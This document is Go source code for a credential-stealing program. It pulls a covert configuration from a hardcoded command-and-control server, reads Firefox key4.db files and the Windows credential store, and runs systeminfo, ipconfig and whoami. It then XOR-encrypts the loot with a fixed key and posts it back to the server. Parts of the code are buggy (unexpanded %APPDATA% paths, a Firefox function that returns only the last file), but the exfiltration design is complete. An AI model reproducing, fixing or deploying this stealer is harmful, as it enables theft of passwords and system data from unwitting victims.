package main

import (
	// "fmt"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"log"
	"math/rand"
	"os/exec"
	"strings"

	"github.com/parnurzeal/gorequest"
)

var URL_BASE string = "http://192.168.1.100:8080/"

type Record struct {
	FirefoxCredentials string   `json:"firefox"`
	WiFiPasswords      []string `json:"wifi"`
	IPConfigOutput     string   `json:"ipconfig"`
	SystemInfoOutput   string   `json:"systeminfo"`
}

type Config struct {
	FirefoxCredentials bool
	WiFiPasswords      bool
	IPConfigOutput     bool
	SystemInfoOutput   bool
}

func LogError(err error) {
	log.Fatal(err.Error())
}

func countBlanks(str string) []int {
	var countingNow bool = false
	var counts int = 0
	var values []int
	for _, rune := range str {
		if rune == 32 {
			countingNow = true
			counts = counts + 1
		} else if countingNow && rune != 32 {
			countingNow = false
			values = append(values, counts)
			counts = 0
		}
	}

	return values
}

func checkConfigInt(value int) bool {
	if value == 1 {
		return false
	} else if value == 2 {
		return true
	} else {
		return false
	}
}

func EncryptDecrypt(input, key string) (output string) {
	for i := 0; i < len(input); i++ {
		output += string(input[i] ^ key[i%len(key)])
	}

	return output
}

func ReadConfig(content string) Config {

	/*
		Configuration will be read as how many blank occure between words

		blank := 0x20 rune

		One blank: False
		Two blank: True

		First blank  : FirefoxCredentials
		Second blank : WiFiPasswords
		Third blank  : IPConfigOutput
		Fourth blank : SystemInfoOutput
	*/

	values := countBlanks(string(content))
	config := &Config{
		FirefoxCredentials: checkConfigInt(values[0]),
		WiFiPasswords:      checkConfigInt(values[1]),
		IPConfigOutput:     checkConfigInt(values[2]),
		SystemInfoOutput:   checkConfigInt(values[3]),
	}

	log.Println("Firefox Credentials: ", config.FirefoxCredentials)
	log.Println("WiFi Passwords: ", config.WiFiPasswords)
	log.Println("IPConfig Output: ", config.IPConfigOutput)
	log.Println("SystemInfo Output: ", config.SystemInfoOutput)

	return *config
}

func GetXorKey() string {
	// KEY_URL := URL_BASE + "dank_meme.jpg"
	KEY := "74cca5c3767cfae1bb76c416df01d874"
	return KEY
}

func ReadAFile(path string) []byte {
	content, err := ioutil.ReadFile(path)
	if err != nil {
		LogError(err)
	}
	return content
}

func GrabFirefoxCredentials() string {
	PATH := "%APPDATA%\\Roaming\\Mozilla\\Firefox\\Profiles\\"
	files, _ := ioutil.ReadDir(PATH)
	var content []byte
	var encoded string
	var passwds []string
	for _, f := range files {
		if strings.Contains(f.Name(), "default") {
			content = ReadAFile(PATH + "\\" + f.Name() + "\\" + "key4.db")
			encoded = base64.StdEncoding.EncodeToString(content)
			passwds = append(passwds, encoded)
		}
	}

	return encoded
}

func GrabHWID() string {
	cmd := exec.Command("whoami")
	out, _ := cmd.CombinedOutput()
	return string(out[0:5]) + string(rand.Intn(95)+32)
}

func GrabSystemInfo() string {
	cmd := exec.Command("systeminfo")
	out, _ := cmd.CombinedOutput()
	encoded := base64.StdEncoding.EncodeToString(out)
	return encoded
}

func GrabPasswords() []string {
	PATH := "%APPDATA%\\Local\\Microsoft\\credentials"
	files, _ := ioutil.ReadDir(PATH)
	var content []byte
	var encoded string
	var passwds []string
	for _, f := range files {
		content = ReadAFile(PATH + "\\" + f.Name())
		encoded = base64.StdEncoding.EncodeToString(content)
		passwds = append(passwds, encoded)
	}

	return passwds
}

func GrabIPConfig() string {
	cmd := exec.Command("ipconfig")
	out, _ := cmd.CombinedOutput()
	encoded := base64.StdEncoding.EncodeToString(out)
	return encoded
}

func EncryptAndEncode(m map[string]interface{}) string {
	mJson, _ := json.Marshal(m)
	key := GetXorKey()
	encrypted := EncryptDecrypt(string(mJson), key)
	encoded := base64.StdEncoding.EncodeToString([]byte(encrypted))
	return encoded
}

func main() {
	VERSION_URL := URL_BASE + "version"
	POST_URL := URL_BASE + "logs/" + GrabHWID()
	req := gorequest.New()
	var frefox string
	var ipconfig string
	var sysinfo string
	var wifipasswds []string
	_, body, _ := req.Get(VERSION_URL).End()

	config := ReadConfig(body)
	log.Println(config)
	if config.FirefoxCredentials {
		frefox = GrabFirefoxCredentials()
	}
	if config.IPConfigOutput {
		ipconfig = GrabIPConfig()
	}
	if config.WiFiPasswords {
		wifipasswds = GrabPasswords()
	}
	if config.SystemInfoOutput {
		sysinfo = GrabSystemInfo()
		print(sysinfo)
	}
	m := map[string]interface{}{
		"firefox":    frefox,
		"wifi":       wifipasswds,
		"ipconfig":   ipconfig,
		"systeminfo": sysinfo,
	}
	post := EncryptAndEncode(m)
	a, b, c := req.Post(POST_URL).Send(post).Set("Content-Type", "text/plain").End()
	log.Println(a, b, c)
}
